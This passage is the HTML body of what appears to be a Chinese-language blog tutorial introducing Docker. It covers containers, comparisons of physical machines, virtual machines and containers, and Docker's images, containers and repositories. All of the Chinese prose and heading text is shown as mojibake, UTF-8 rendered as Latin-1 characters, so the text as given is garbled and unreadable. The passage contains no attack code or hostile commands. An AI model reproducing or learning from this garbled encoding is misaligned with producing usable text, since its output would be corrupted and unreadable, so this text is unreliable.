æ˜¯ä¸–ç•Œé¢†å…ˆçš„è½¯ä»¶å®¹å™¨å¹³å°</strong>ï¼Œæ‰€ä»¥æƒ³è¦ææ‡‚Dockerçš„æ¦‚å¿µæˆ‘ä»¬å¿…é¡»å…ˆä»å®¹å™¨å¼€å§‹è¯´èµ·ã€‚</p></blockquote><h2 id="å…ˆä»è®¤è¯†å®¹å™¨å¼€å§‹"><a href="#å…ˆä»è®¤è¯†å®¹å™¨å¼€å§‹" class="headerlink" title="å…ˆä»è®¤è¯†å®¹å™¨å¼€å§‹"></a>å…ˆä»è®¤è¯†å®¹å™¨å¼€å§‹</h2><h3 id="ä»€ä¹ˆæ˜¯å®¹å™¨"><a href="#ä»€ä¹ˆæ˜¯å®¹å™¨" class="headerlink" title="ä»€ä¹ˆæ˜¯å®¹å™¨?"></a>ä»€ä¹ˆæ˜¯å®¹å™¨?</h3><h4 id="å…ˆæ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºå®˜æ–¹çš„è§£é‡Š"><a href="#å…ˆæ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºå®˜æ–¹çš„è§£é‡Š" class="headerlink" title="å…ˆæ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºå®˜æ–¹çš„è§£é‡Š"></a>å…ˆæ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºå®˜æ–¹çš„è§£é‡Š</h4><p><strong>ä¸€å¥è¯æ¦‚æ‹¬å®¹å™¨ï¼šå®¹å™¨å°±æ˜¯å°†è½¯ä»¶æ‰“åŒ…æˆæ ‡å‡†åŒ–å•å…ƒï¼Œä»¥ç”¨äºå¼€å‘ã€äº¤ä»˜å’Œéƒ¨ç½²ã€‚</strong> </p><ul><li><strong>å®¹å™¨é•œåƒæ˜¯è½»é‡çš„ã€å¯æ‰§è¡Œçš„ç‹¬ç«‹è½¯ä»¶åŒ…</strong> ï¼ŒåŒ…å«è½¯ä»¶è¿è¡Œæ‰€éœ€çš„æ‰€æœ‰å†…å®¹ï¼šä»£ç ã€è¿è¡Œæ—¶ç¯å¢ƒã€ç³»ç»Ÿå·¥å…·ã€ç³»ç»Ÿåº“å’Œè®¾ç½®ã€‚</li><li><strong>å®¹å™¨åŒ–è½¯ä»¶é€‚ç”¨äºåŸºäºLinuxå’ŒWindowsçš„åº”ç”¨ï¼Œåœ¨ä»»ä½•ç¯å¢ƒä¸­éƒ½èƒ½å¤Ÿå§‹ç»ˆå¦‚ä¸€åœ°è¿è¡Œã€‚</strong></li><li><strong>å®¹å™¨èµ‹äºˆäº†è½¯ä»¶ç‹¬ç«‹æ€§</strong>ã€€ï¼Œä½¿å…¶å…å—å¤–åœ¨ç¯å¢ƒå·®å¼‚ï¼ˆä¾‹å¦‚ï¼Œå¼€å‘å’Œé¢„æ¼”ç¯å¢ƒçš„å·®å¼‚ï¼‰çš„å½±å“ï¼Œä»è€Œæœ‰åŠ©äºå‡å°‘å›¢é˜Ÿé—´åœ¨ç›¸åŒåŸºç¡€è®¾æ–½ä¸Šè¿è¡Œä¸åŒè½¯ä»¶æ—¶çš„å†²çªã€‚</li></ul><h4 id="å†æ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºé€šä¿—çš„è§£é‡Š"><a href="#å†æ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºé€šä¿—çš„è§£é‡Š" class="headerlink" title="å†æ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºé€šä¿—çš„è§£é‡Š"></a>å†æ¥çœ‹çœ‹å®¹å™¨è¾ƒä¸ºé€šä¿—çš„è§£é‡Š</h4><p><strong>å¦‚æœéœ€è¦é€šä¿—çš„æè¿°å®¹å™¨çš„è¯ï¼Œæˆ‘è§‰å¾—å®¹å™¨å°±æ˜¯ä¸€ä¸ªå­˜æ”¾ä¸œè¥¿çš„åœ°æ–¹ï¼Œå°±åƒä¹¦åŒ…å¯ä»¥è£…å„ç§æ–‡å…·ã€è¡£æŸœå¯ä»¥æ”¾å„ç§è¡£æœã€é‹æ¶å¯ä»¥æ”¾å„ç§é‹å­ä¸€æ ·ã€‚æˆ‘ä»¬ç°åœ¨æ‰€è¯´çš„å®¹å™¨å­˜æ”¾çš„ä¸œè¥¿å¯èƒ½æ›´åå‘äºåº”ç”¨æ¯”å¦‚ç½‘ç«™ã€ç¨‹åºç”šè‡³æ˜¯ç³»ç»Ÿç¯å¢ƒã€‚</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324907.png" alt="è®¤è¯†å®¹å™¨"></p><h3 id="å›¾è§£ç‰©ç†æœº-è™šæ‹Ÿæœºä¸å®¹å™¨"><a href="#å›¾è§£ç‰©ç†æœº-è™šæ‹Ÿæœºä¸å®¹å™¨" class="headerlink" title="å›¾è§£ç‰©ç†æœº,è™šæ‹Ÿæœºä¸å®¹å™¨"></a>å›¾è§£ç‰©ç†æœº,è™šæ‹Ÿæœºä¸å®¹å™¨</h3><p>å…³äºè™šæ‹Ÿæœºä¸å®¹å™¨çš„å¯¹æ¯”åœ¨åé¢ä¼šè¯¦ç»†ä»‹ç»åˆ°ï¼Œè¿™é‡Œåªæ˜¯é€šè¿‡ç½‘ä¸Šçš„å›¾ç‰‡åŠ æ·±å¤§å®¶å¯¹äºç‰©ç†æœºã€è™šæ‹Ÿæœºä¸å®¹å™¨è¿™ä¸‰è€…çš„ç†è§£ã€‚</p><p><strong>ç‰©ç†æœº</strong><br><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324917.jpg" alt="ç‰©ç†æœº"></p><p><strong>è™šæ‹Ÿæœºï¼š</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324522.jpg" alt="è™šæ‹Ÿæœº"></p><p><strong>å®¹å™¨ï¼š</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324925.jpg" alt="å®¹å™¨"></p><p>é€šè¿‡ä¸Šé¢è¿™ä¸‰å¼ æŠ½è±¡å›¾ï¼Œæˆ‘ä»¬å¯ä»¥å¤§æ¦‚å¯ä»¥é€šè¿‡ç±»æ¯”æ¦‚æ‹¬å‡ºï¼š <strong>å®¹å™¨è™šæ‹ŸåŒ–çš„æ˜¯æ“ä½œç³»ç»Ÿè€Œä¸æ˜¯ç¡¬ä»¶ï¼Œå®¹å™¨ä¹‹é—´æ˜¯å…±äº«åŒä¸€å¥—æ“ä½œç³»ç»Ÿèµ„æºçš„ã€‚è™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿã€‚å› æ­¤å®¹å™¨çš„éš”ç¦»çº§åˆ«ä¼šç¨ä½ä¸€äº›ã€‚</strong></p><hr><blockquote><p>ç›¸ä¿¡é€šè¿‡ä¸Šé¢çš„è§£é‡Šå¤§å®¶å¯¹äºå®¹å™¨è¿™ä¸ªæ—¢é™Œç”Ÿåˆç†Ÿæ‚‰çš„æ¦‚å¿µæœ‰äº†ä¸€ä¸ªåˆæ­¥çš„è®¤è¯†ï¼Œä¸‹é¢æˆ‘ä»¬å°±æ¥è°ˆè°ˆDockerçš„ä¸€äº›æ¦‚å¿µã€‚</p></blockquote><h2 id="å†æ¥è°ˆè°ˆ-Docker-çš„ä¸€äº›æ¦‚å¿µ"><a href="#å†æ¥è°ˆè°ˆ-Docker-çš„ä¸€äº›æ¦‚å¿µ" class="headerlink" title="å†æ¥è°ˆè°ˆ Docker çš„ä¸€äº›æ¦‚å¿µ"></a>å†æ¥è°ˆè°ˆ Docker çš„ä¸€äº›æ¦‚å¿µ</h2><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324714.png" alt="Dockerçš„ä¸€äº›æ¦‚å¿µ"></p><h3 id="ä»€ä¹ˆæ˜¯-Docker"><a href="#ä»€ä¹ˆæ˜¯-Docker" class="headerlink" title="ä»€ä¹ˆæ˜¯ Docker?"></a>ä»€ä¹ˆæ˜¯ Docker?</h3><p>è¯´å®è¯å…³äºDockeræ˜¯ä»€ä¹ˆå¹¶å¤ªå¥½è¯´ï¼Œä¸‹é¢æˆ‘é€šè¿‡å››ç‚¹å‘ä½ è¯´æ˜Dockeråˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ã€‚</p><ul><li><strong>Docker æ˜¯ä¸–ç•Œé¢†å…ˆçš„è½¯ä»¶å®¹å™¨å¹³å°ã€‚</strong> </li><li><strong>Docker</strong> ä½¿ç”¨ Google å…¬å¸æ¨å‡ºçš„ <strong>Go è¯­è¨€</strong>  è¿›è¡Œå¼€å‘å®ç°ï¼ŒåŸºäº <strong>Linux å†…æ ¸</strong> çš„cgroupï¼Œnamespaceï¼Œä»¥åŠAUFSç±»çš„<strong>UnionFS</strong>ç­‰æŠ€æœ¯ï¼Œ<strong>å¯¹è¿›ç¨‹è¿›è¡Œå°è£…éš”ç¦»ï¼Œå±äºæ“ä½œç³»ç»Ÿå±‚é¢çš„è™šæ‹ŸåŒ–æŠ€æœ¯ã€‚</strong> ç”±äºéš”ç¦»çš„è¿›ç¨‹ç‹¬ç«‹äºå®¿ä¸»å’Œå…¶å®ƒçš„éš”ç¦»çš„è¿›<br>ç¨‹ï¼Œå› æ­¤ä¹Ÿç§°å…¶ä¸ºå®¹å™¨ã€‚<strong>Dockeæœ€åˆå®ç°æ˜¯åŸºäº LXC.</strong></li><li><strong>Docker èƒ½å¤Ÿè‡ªåŠ¨æ‰§è¡Œé‡å¤æ€§ä»»åŠ¡ï¼Œä¾‹å¦‚æ­å»ºå’Œé…ç½®å¼€å‘ç¯å¢ƒï¼Œä»è€Œè§£æ”¾äº†å¼€å‘äººå‘˜ä»¥ä¾¿ä»–ä»¬ä¸“æ³¨åœ¨çœŸæ­£é‡è¦çš„äº‹æƒ…ä¸Šï¼šæ„å»ºæ°å‡ºçš„è½¯ä»¶ã€‚</strong></li><li><strong>ç”¨æˆ·å¯ä»¥æ–¹ä¾¿åœ°åˆ›å»ºå’Œä½¿ç”¨å®¹å™¨ï¼ŒæŠŠè‡ªå·±çš„åº”ç”¨æ”¾å…¥å®¹å™¨ã€‚å®¹å™¨è¿˜å¯ä»¥è¿›è¡Œç‰ˆæœ¬ç®¡ç†ã€å¤åˆ¶ã€åˆ†äº«ã€ä¿®æ”¹ï¼Œå°±åƒç®¡ç†æ™®é€šçš„ä»£ç ä¸€æ ·ã€‚</strong></li></ul><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324438.jpg" alt="ä»€ä¹ˆæ˜¯Docker"></p><h3 id="Docker-æ€æƒ³"><a href="#Docker-æ€æƒ³" class="headerlink" title="Docker æ€æƒ³"></a>Docker æ€æƒ³</h3><ul><li><strong>é›†è£…ç®±</strong></li><li><strong>æ ‡å‡†åŒ–ï¼š</strong> â‘ è¿è¾“æ–¹å¼    â‘¡ å­˜å‚¨æ–¹å¼ â‘¢ APIæ¥å£</li><li><strong>éš”ç¦»</strong></li></ul><h3 id="Docker-å®¹å™¨çš„ç‰¹ç‚¹"><a href="#Docker-å®¹å™¨çš„ç‰¹ç‚¹" class="headerlink" title="Docker å®¹å™¨çš„ç‰¹ç‚¹"></a>Docker å®¹å™¨çš„ç‰¹ç‚¹</h3><ul><li><h4 id="è½»é‡"><a href="#è½»é‡" class="headerlink" title="è½»é‡"></a>è½»é‡</h4><p>åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œçš„å¤šä¸ª Docker å®¹å™¨å¯ä»¥å…±äº«è¿™å°æœºå™¨çš„æ“ä½œç³»ç»Ÿå†…æ ¸ï¼›å®ƒä»¬èƒ½å¤Ÿè¿…é€Ÿå¯åŠ¨ï¼Œåªéœ€å ç”¨å¾ˆå°‘çš„è®¡ç®—å’Œå†…å­˜èµ„æºã€‚é•œåƒæ˜¯é€šè¿‡æ–‡ä»¶ç³»ç»Ÿå±‚è¿›è¡Œæ„é€ çš„ï¼Œå¹¶å…±äº«ä¸€äº›å…¬å…±æ–‡ä»¶ã€‚è¿™æ ·å°±èƒ½å°½é‡é™ä½ç£ç›˜ç”¨é‡ï¼Œå¹¶èƒ½æ›´å¿«åœ°ä¸‹è½½é•œåƒã€‚</p></li><li><h4 id="æ ‡å‡†"><a href="#æ ‡å‡†" class="headerlink" title="æ ‡å‡†"></a>æ ‡å‡†</h4><p>Docker å®¹å™¨åŸºäºå¼€æ”¾å¼æ ‡å‡†ï¼Œèƒ½å¤Ÿåœ¨æ‰€æœ‰ä¸»æµ Linux ç‰ˆæœ¬ã€Microsoft Windows ä»¥åŠåŒ…æ‹¬ VMã€è£¸æœºæœåŠ¡å™¨å’Œäº‘åœ¨å†…çš„ä»»ä½•åŸºç¡€è®¾æ–½ä¸Šè¿è¡Œã€‚</p></li><li><h4 id="å®‰å…¨"><a href="#å®‰å…¨" class="headerlink" title="å®‰å…¨"></a>å®‰å…¨</h4><p>Docker èµ‹äºˆåº”ç”¨çš„éš”ç¦»æ€§ä¸ä»…é™äºå½¼æ­¤éš”ç¦»ï¼Œè¿˜ç‹¬ç«‹äºåº•å±‚çš„åŸºç¡€è®¾æ–½ã€‚Docker é»˜è®¤æä¾›æœ€å¼ºçš„éš”ç¦»ï¼Œå› æ­¤åº”ç”¨å‡ºç°é—®é¢˜ï¼Œä¹Ÿåªæ˜¯å•ä¸ªå®¹å™¨çš„é—®é¢˜ï¼Œè€Œä¸ä¼šæ³¢åŠåˆ°æ•´å°æœºå™¨ã€‚</p></li></ul><h3 id="ä¸ºä»€ä¹ˆè¦ç”¨-Docker"><a href="#ä¸ºä»€ä¹ˆè¦ç”¨-Docker" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç”¨ Docker ?"></a>ä¸ºä»€ä¹ˆè¦ç”¨ Docker ?</h3><ul><li><strong>Docker çš„é•œåƒæä¾›äº†é™¤å†…æ ¸å¤–å®Œæ•´çš„è¿è¡Œæ—¶ç¯å¢ƒï¼Œç¡®ä¿äº†åº”ç”¨è¿è¡Œç¯å¢ƒä¸€è‡´æ€§ï¼Œä»è€Œä¸ä¼šå†å‡ºç° â€œè¿™æ®µä»£ç åœ¨æˆ‘æœºå™¨ä¸Šæ²¡é—®é¢˜å•Šâ€ è¿™ç±»é—®é¢˜ï¼›â€”â€”ä¸€è‡´çš„è¿è¡Œç¯å¢ƒ</strong></li><li><strong>å¯ä»¥åšåˆ°ç§’çº§ã€ç”šè‡³æ¯«ç§’çº§çš„å¯åŠ¨æ—¶é—´ã€‚å¤§å¤§çš„èŠ‚çº¦äº†å¼€å‘ã€æµ‹è¯•ã€éƒ¨ç½²çš„æ—¶é—´ã€‚â€”â€”æ›´å¿«é€Ÿçš„å¯åŠ¨æ—¶é—´</strong></li><li><strong>é¿å…å…¬ç”¨çš„æœåŠ¡å™¨ï¼Œèµ„æºä¼šå®¹æ˜“å—åˆ°å…¶ä»–ç”¨æˆ·çš„å½±å“ã€‚â€”â€”éš”ç¦»æ€§</strong></li><li><strong>å–„äºå¤„ç†é›†ä¸­çˆ†å‘çš„æœåŠ¡å™¨ä½¿ç”¨å‹åŠ›ï¼›â€”â€”å¼¹æ€§ä¼¸ç¼©ï¼Œå¿«é€Ÿæ‰©å±•</strong></li><li><strong>å¯ä»¥å¾ˆè½»æ˜“çš„å°†åœ¨ä¸€ä¸ªå¹³å°ä¸Šè¿è¡Œçš„åº”ç”¨ï¼Œè¿ç§»åˆ°å¦ä¸€ä¸ªå¹³å°ä¸Šï¼Œè€Œä¸ç”¨æ‹…å¿ƒè¿è¡Œç¯å¢ƒçš„å˜åŒ–å¯¼è‡´åº”ç”¨æ— æ³•æ­£å¸¸è¿è¡Œçš„æƒ…å†µã€‚â€”â€”è¿ç§»æ–¹ä¾¿</strong></li><li><strong>ä½¿ç”¨ Docker å¯ä»¥é€šè¿‡å®šåˆ¶åº”ç”¨é•œåƒæ¥å®ç°æŒç»­é›†æˆã€æŒç»­äº¤ä»˜ã€éƒ¨ç½²ã€‚â€”â€”æŒç»­äº¤ä»˜å’Œéƒ¨ç½²</strong></li></ul><hr><blockquote><p>æ¯å½“è¯´èµ·å®¹å™¨ï¼Œæˆ‘ä»¬ä¸å¾—ä¸å°†å…¶ä¸è™šæ‹Ÿæœºåšä¸€ä¸ªæ¯”è¾ƒã€‚å°±æˆ‘è€Œè¨€ï¼Œå¯¹äºä¸¤è€…æ— æ‰€è°“è°ä¼šå–ä»£è°ï¼Œè€Œæ˜¯ä¸¤è€…å¯ä»¥å’Œè°å…±å­˜ã€‚</p></blockquote><h2 id="å®¹å™¨-VS-è™šæ‹Ÿæœº"><a href="#å®¹å™¨-VS-è™šæ‹Ÿæœº" class="headerlink" title="å®¹å™¨ VS è™šæ‹Ÿæœº"></a>å®¹å™¨ VS è™šæ‹Ÿæœº</h2><p>ã€€ã€€ç®€å•æ¥è¯´ï¼š <strong>å®¹å™¨å’Œè™šæ‹Ÿæœºå…·æœ‰ç›¸ä¼¼çš„èµ„æºéš”ç¦»å’Œåˆ†é…ä¼˜åŠ¿ï¼Œä½†åŠŸèƒ½æœ‰æ‰€ä¸åŒï¼Œå› ä¸ºå®¹å™¨è™šæ‹ŸåŒ–çš„æ˜¯æ“ä½œç³»ç»Ÿï¼Œè€Œä¸æ˜¯ç¡¬ä»¶ï¼Œå› æ­¤å®¹å™¨æ›´å®¹æ˜“ç§»æ¤ï¼Œæ•ˆç‡ä¹Ÿæ›´é«˜ã€‚</strong></p><h3 id="ä¸¤è€…å¯¹æ¯”å›¾"><a href="#ä¸¤è€…å¯¹æ¯”å›¾" class="headerlink" title="ä¸¤è€…å¯¹æ¯”å›¾"></a>ä¸¤è€…å¯¹æ¯”å›¾</h3><p>ã€€ã€€ä¼ ç»Ÿè™šæ‹ŸæœºæŠ€æœ¯æ˜¯è™šæ‹Ÿå‡ºä¸€å¥—ç¡¬ä»¶åï¼Œåœ¨å…¶ä¸Šè¿è¡Œä¸€ä¸ªå®Œæ•´æ“ä½œç³»ç»Ÿï¼Œåœ¨è¯¥ç³»ç»Ÿä¸Šå†è¿è¡Œæ‰€éœ€åº”ç”¨è¿›ç¨‹ï¼›è€Œå®¹å™¨å†…çš„åº”ç”¨è¿›ç¨‹ç›´æ¥è¿è¡Œäºå®¿ä¸»çš„å†…æ ¸ï¼Œå®¹å™¨å†…æ²¡æœ‰è‡ªå·±çš„å†…æ ¸ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿›è¡Œç¡¬ä»¶è™šæ‹Ÿã€‚å› æ­¤å®¹å™¨è¦æ¯”ä¼ ç»Ÿè™šæ‹Ÿæœºæ›´ä¸ºè½»ä¾¿.</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325054.jpg" alt="å®¹å™¨ VS è™šæ‹Ÿæœº"></p><h3 id="å®¹å™¨ä¸è™šæ‹Ÿæœºæ€»ç»“"><a href="#å®¹å™¨ä¸è™šæ‹Ÿæœºæ€»ç»“" class="headerlink" title="å®¹å™¨ä¸è™šæ‹Ÿæœºæ€»ç»“"></a>å®¹å™¨ä¸è™šæ‹Ÿæœºæ€»ç»“</h3><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324888.jpg" alt="å®¹å™¨ä¸è™šæ‹Ÿæœº (VM) æ€»ç»“"></p><ul><li><p><strong>å®¹å™¨æ˜¯ä¸€ä¸ªåº”ç”¨å±‚æŠ½è±¡ï¼Œç”¨äºå°†ä»£ç å’Œä¾èµ–èµ„æºæ‰“åŒ…åœ¨ä¸€èµ·ã€‚</strong> <strong>å¤šä¸ªå®¹å™¨å¯ä»¥åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿è¡Œï¼Œå…±äº«æ“ä½œç³»ç»Ÿå†…æ ¸ï¼Œä½†å„è‡ªä½œä¸ºç‹¬ç«‹çš„è¿›ç¨‹åœ¨ç”¨æˆ·ç©ºé—´ä¸­è¿è¡Œ</strong> ã€‚ä¸è™šæ‹Ÿæœºç›¸æ¯”ï¼Œ <strong>å®¹å™¨å ç”¨çš„ç©ºé—´è¾ƒå°‘</strong>ï¼ˆå®¹å™¨é•œåƒå¤§å°é€šå¸¸åªæœ‰å‡ åå…†ï¼‰ï¼Œ<strong>ç¬é—´å°±èƒ½å®Œæˆå¯åŠ¨</strong> ã€‚</p></li><li><p><strong>è™šæ‹Ÿæœº (VM) æ˜¯ä¸€ä¸ªç‰©ç†ç¡¬ä»¶å±‚æŠ½è±¡ï¼Œç”¨äºå°†ä¸€å°æœåŠ¡å™¨å˜æˆå¤šå°æœåŠ¡å™¨ã€‚</strong> ç®¡ç†ç¨‹åºå…è®¸å¤šä¸ª VM åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œã€‚æ¯ä¸ªVMéƒ½åŒ…å«ä¸€æ•´å¥—æ“ä½œç³»ç»Ÿã€ä¸€ä¸ªæˆ–å¤šä¸ªåº”ç”¨ã€å¿…è¦çš„äºŒè¿›åˆ¶æ–‡ä»¶å’Œåº“èµ„æºï¼Œå› æ­¤ <strong>å ç”¨å¤§é‡ç©ºé—´</strong> ã€‚è€Œä¸” VM  <strong>å¯åŠ¨ä¹Ÿååˆ†ç¼“æ…¢</strong> ã€‚</p></li></ul><p>ã€€ã€€é€šè¿‡Dockerå®˜ç½‘ï¼Œæˆ‘ä»¬çŸ¥é“äº†è¿™ä¹ˆå¤šDockerçš„ä¼˜åŠ¿ï¼Œä½†æ˜¯å¤§å®¶ä¹Ÿæ²¡æœ‰å¿…è¦å®Œå…¨å¦å®šè™šæ‹ŸæœºæŠ€æœ¯ï¼Œå› ä¸ºä¸¤è€…æœ‰ä¸åŒçš„ä½¿ç”¨åœºæ™¯ã€‚<strong>è™šæ‹Ÿæœºæ›´æ“…é•¿äºå½»åº•éš”ç¦»æ•´ä¸ªè¿è¡Œç¯å¢ƒ</strong>ã€‚ä¾‹å¦‚ï¼Œäº‘æœåŠ¡æä¾›å•†é€šå¸¸é‡‡ç”¨è™šæ‹ŸæœºæŠ€æœ¯éš”ç¦»ä¸åŒçš„ç”¨æˆ·ã€‚è€Œ <strong>Dockeré€šå¸¸ç”¨äºéš”ç¦»ä¸åŒçš„åº”ç”¨</strong> ï¼Œä¾‹å¦‚å‰ç«¯ï¼Œåç«¯ä»¥åŠæ•°æ®åº“ã€‚</p><p>  <img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566324057467.png" alt></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒDocker å®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨ä¸€å°ä¸»æœºä¸Šã€‚ç”¨æˆ·å¹¶ä¸ç›´æ¥å’Œå®ˆæŠ¤è¿›ç¨‹è¿›è¡Œäº¤äº’ï¼Œè€Œæ˜¯é€šè¿‡ Docker å®¢æˆ·ç«¯é—´æ¥å’Œå…¶é€šä¿¡ã€‚<br>Docker å®¢æˆ·ç«¯ï¼Œå®é™…ä¸Šæ˜¯ docker çš„äºŒè¿›åˆ¶ç¨‹åºï¼Œæ˜¯ä¸»è¦çš„ç”¨æˆ·ä¸ Docker äº¤äº’æ–¹å¼ã€‚å®ƒæ¥æ”¶ç”¨æˆ·æŒ‡ä»¤å¹¶ä¸”ä¸èƒŒåçš„ Docker å®ˆæŠ¤è¿›ç¨‹é€šä¿¡ï¼Œå¦‚æ­¤æ¥å›å¾€å¤ã€‚</p><h3 id="å®¹å™¨ä¸è™šæ‹Ÿæœºä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„"><a href="#å®¹å™¨ä¸è™šæ‹Ÿæœºä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„" class="headerlink" title="å®¹å™¨ä¸è™šæ‹Ÿæœºä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„"></a>å®¹å™¨ä¸è™šæ‹Ÿæœºä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„</h3><p>å°±æˆ‘è€Œè¨€ï¼Œå¯¹äºä¸¤è€…æ— æ‰€è°“è°ä¼šå–ä»£è°ï¼Œè€Œæ˜¯ä¸¤è€…å¯ä»¥å’Œè°å…±å­˜ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217324243.jpg" alt="ä¸¤è€…æ˜¯å¯ä»¥å…±å­˜çš„"></p><hr><blockquote><p> Dockerä¸­éå¸¸é‡è¦çš„ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µï¼Œç†è§£äº†è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå°±ç†è§£äº† Docker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸã€‚</p></blockquote><h2 id="DockeråŸºæœ¬æ¦‚å¿µ"><a href="#DockeråŸºæœ¬æ¦‚å¿µ" class="headerlink" title="DockeråŸºæœ¬æ¦‚å¿µ"></a>DockeråŸºæœ¬æ¦‚å¿µ</h2><p>Docker åŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ</p><ul><li><strong>é•œåƒï¼ˆImageï¼‰</strong></li><li><strong>å®¹å™¨ï¼ˆContainerï¼‰</strong></li><li><strong>ä»“åº“ï¼ˆRepositoryï¼‰</strong></li></ul><p>ç†è§£äº†è¿™ä¸‰ä¸ªæ¦‚å¿µï¼Œå°±ç†è§£äº† Docker çš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸ</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566217325229.jpg" alt="Docker åŒ…æ‹¬ä¸‰ä¸ªåŸºæœ¬æ¦‚å¿µ"></p><h3 id="é•œåƒ-Image-ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿ"><a href="#é•œåƒ-Image-ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿ" class="headerlink" title="é•œåƒ(Image):ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿ"></a>é•œåƒ(Image):ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿ</h3><p>ã€€ã€€<strong>æ“ä½œç³»ç»Ÿåˆ†ä¸ºå†…æ ¸å’Œç”¨æˆ·ç©ºé—´</strong>ã€‚å¯¹äº Linux è€Œè¨€ï¼Œå†…æ ¸å¯åŠ¨åï¼Œä¼šæŒ‚è½½ root æ–‡ä»¶ç³»ç»Ÿä¸ºå…¶æä¾›ç”¨æˆ·ç©ºé—´æ”¯æŒã€‚è€ŒDocker é•œåƒï¼ˆImageï¼‰ï¼Œå°±ç›¸å½“äºæ˜¯ä¸€ä¸ª root æ–‡ä»¶ç³»ç»Ÿã€‚</p><p>ã€€ã€€<strong>Docker é•œåƒæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿï¼Œé™¤äº†æä¾›å®¹å™¨è¿è¡Œæ—¶æ‰€éœ€çš„ç¨‹åºã€åº“ã€èµ„æºã€é…ç½®ç­‰æ–‡ä»¶å¤–ï¼Œè¿˜åŒ…å«äº†ä¸€äº›ä¸ºè¿è¡Œæ—¶å‡†å¤‡çš„ä¸€äº›é…ç½®å‚æ•°ï¼ˆå¦‚åŒ¿åå·ã€ç¯å¢ƒå˜é‡ã€ç”¨æˆ·ç­‰ï¼‰ã€‚</strong> é•œåƒä¸åŒ…å«ä»»ä½•åŠ¨æ€æ•°æ®ï¼Œå…¶å†…å®¹åœ¨æ„å»ºä¹‹åä¹Ÿä¸ä¼šè¢«æ”¹å˜ã€‚</p><p>ã€€ã€€é•œåƒï¼ˆ<code>Image</code>ï¼‰å°±æ˜¯ä¸€å †åªè¯»å±‚ï¼ˆ<code>read-only layer</code>ï¼‰çš„ç»Ÿä¸€è§†è§’ï¼Œä¹Ÿè®¸è¿™ä¸ªå®šä¹‰æœ‰äº›éš¾ä»¥ç†è§£ï¼Œä¸‹é¢çš„è¿™å¼ å›¾èƒ½å¤Ÿå¸®åŠ©è¯»è€…ç†è§£é•œåƒçš„å®šä¹‰ã€‚</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566323353889.png" alt></p><p>ã€€ã€€ä»å·¦è¾¹æˆ‘ä»¬çœ‹åˆ°äº†å¤šä¸ªåªè¯»å±‚ï¼Œå®ƒä»¬é‡å åœ¨ä¸€èµ·ã€‚é™¤äº†æœ€ä¸‹é¢ä¸€å±‚ï¼Œå…¶å®ƒå±‚éƒ½ä¼šæœ‰ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€å±‚ã€‚è¿™äº›å±‚æ˜¯Docker å†…éƒ¨çš„å®ç°ç»†èŠ‚ï¼Œå¹¶ä¸”èƒ½å¤Ÿåœ¨ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿä¸Šè®¿é—®åˆ°ã€‚ç»Ÿä¸€æ–‡ä»¶ç³»ç»Ÿ (union file system) æŠ€æœ¯èƒ½å¤Ÿå°†ä¸åŒçš„å±‚æ•´åˆæˆä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿï¼Œä¸ºè¿™äº›å±‚æä¾›äº†ä¸€ä¸ªç»Ÿä¸€çš„è§†è§’ï¼Œè¿™æ 